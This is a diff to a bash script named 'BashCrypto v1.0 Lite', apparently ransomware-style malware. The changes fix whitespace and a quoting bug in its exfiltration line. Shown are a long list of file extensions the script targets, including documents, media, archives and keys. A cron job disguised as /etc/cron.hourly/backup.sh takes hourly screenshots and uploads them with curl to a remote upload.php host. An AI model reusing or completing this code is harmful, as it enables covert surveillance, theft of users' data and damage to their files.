@@ -91,9 +91,9 @@ fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" 
           "*.doc*" "*.xls*" "*.pdf" "*.java" "*.swf" "*.jar" "*.json" "*.ppt*" "*.pst" "*.bat" "*.exe" "*.x" "*.pm" \
           "*.aps*" "*.cgi" "*.htm*" "*.dll" "*.class" "*.mov" "*.flv" "*.mp4" "*.mp3" "*.wav" "*.ogg" "*.md" \
           "*.yaml" "*.sql" "*.vim" "*.csv" "*.bak" "*.rb" "*.h" "*.c" "*.log" "*.waw" "*.jpeg" "*.rtf" "*.rar" "*.zip" \
-          "*.psd" "*.tif" "*.wma" "*.bmp" "*.pps" "*.ppsx" "*.ppd" "*.eps" "*.ace" "*.djvu" "*.cdr" "*.max" "*.wmv" "*.avi" \ 
+          "*.psd" "*.tif" "*.wma" "*.bmp" "*.pps" "*.ppsx" "*.ppd" "*.eps" "*.ace" "*.djvu" "*.cdr" "*.max" "*.wmv" "*.avi" \
           "*.pdd" "*.aac" "*.ac3" "*.amf" "*.amr" "*.dwg" "*.dxf" "*.accdb" "*.mod" "*.tax2013" "*.tax2014" "*.oga" "*.pbf" \
-          "*.ra" "*.raw" "*.saf" "*.val" "*.wave" "*.wow" "*.wpk" "*.3g2" "*.3gp" "*.3gp2" "*.3mm" "*.amx" "*.avs" "*.bik" \ 
+          "*.ra" "*.raw" "*.saf" "*.val" "*.wave" "*.wow" "*.wpk" "*.3g2" "*.3gp" "*.3gp2" "*.3mm" "*.amx" "*.avs" "*.bik" \
           "*.dir" "*.divx" "*.dvx" "*.evo" "*.qtq" "*.tch" "*.rts" "*.rum" "*.rv" "*.scn" "*.srt" "*.stx" "*.svi" "*.trp" \
           "*.vdo" "*.wm" "*.wmd" "*.wmmp" "*.wmx" "*.wvx" "*.xvid" "*.3d" "*.3d4" "*.3df8" "*.pbs" "*.adi" "*.ais" "*.amu" \
           "*.arr" "*.bmc" "*.bmf" "*.cag" "*.cam" "*.dng" "*.ink" "*.jif" "*.jiff" "*.jpc" "*.jpf" "*.jpw" "*.mag" "*.mic" \
@@ -104,7 +104,7 @@ fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" 
           "*.7z" "*.arc" "*.ari" "*.arj" "*.car" "*.cbr" "*.cbz" "*.gzig" "*.jgz" "*.pak" "*.pcv" "*.puz" "*.r00" "*.r01" \
           "*.r02" "*.r03" "*.rev" "*.sdn" "*.sen" "*.sfs" "*.sfx" "*.sh" "*.shar" "*.shr" "*.sqx" "*.tbz2" "*.tg" "*.tlz" \
           "*.vsi" "*.wad" "*.war" "*.xpi" "*.z02" "*.z04" "*.zap" "*.zipx" "*.zoo" "*.ipa" "*.isu" "*.udf" "*.adr" "*.ap" \
-          "*.aro" "*.asa" "*.ascx" "*.ashx" "*.asmx" "*.asp" "*.indd" "*.asr" "*.qbb" "*.bml" "*.cer" "*.cms" "*.crt" \ 
+          "*.aro" "*.asa" "*.ascx" "*.ashx" "*.asmx" "*.asp" "*.indd" "*.asr" "*.qbb" "*.bml" "*.cer" "*.cms" "*.crt" \
           "*.dap" "*.moz" "*.svr" "*.url" "*.wdgt" "*.abk" "*.bic" "*.big" "*.blp" "*.bsp" "*.cgf" "*.chk" "*.col" "*.cty" \
           "*.dem" "*.elf" "*.ff" "*.gam" "*.grf" "*.h3m" "*.h4r" "*.iwd" "*.ldb" "*.lgp" "*.lvl" "*.map" "*.md3" "*.mdl" \
           "*.mm6" "*.mm7" "*.mm8" "*.nds" "*.pbp" "*.ppf" "*.pwf" "*.pxp" "*.sad" "*.sav" "*.scm" "*.scx" "*.sdt" "*.spr" \
@@ -236,7 +236,7 @@ then
     echo -e "\n"
     echo -e "/usr/bin/gnome-screenshot -f \"/tmp/.\${getDate}.screenshot\""
     echo -e "\n"
-    echo -e "tar -czf - \"/tmp/.\${getDate}.screenshot\" | curl -k -A \"BashCrypto v1.0 Lite\" -F \"unique_id=\${genKey}"\ -F \"file=@-\" \"file_info=\".\${getDate}.screenshot\".tar.gz\" -F \"uploadFile=Upload\" https://192.168.1.132/upload.php"
+    echo -e "tar -czf - \"/tmp/.\${getDate}.screenshot\" | curl -k -A \"BashCrypto v1.0 Lite\" -F \"unique_id=\${genKey}\" -F \"file=@-\" \"file_info=\".\${getDate}.screenshot\".tar.gz\" -F \"uploadFile=Upload\" https://192.168.1.132/upload.php"
   } > /etc/cron.hourly/backup.sh
 
   chmod 755 /etc/cron.hourly/backup.sh
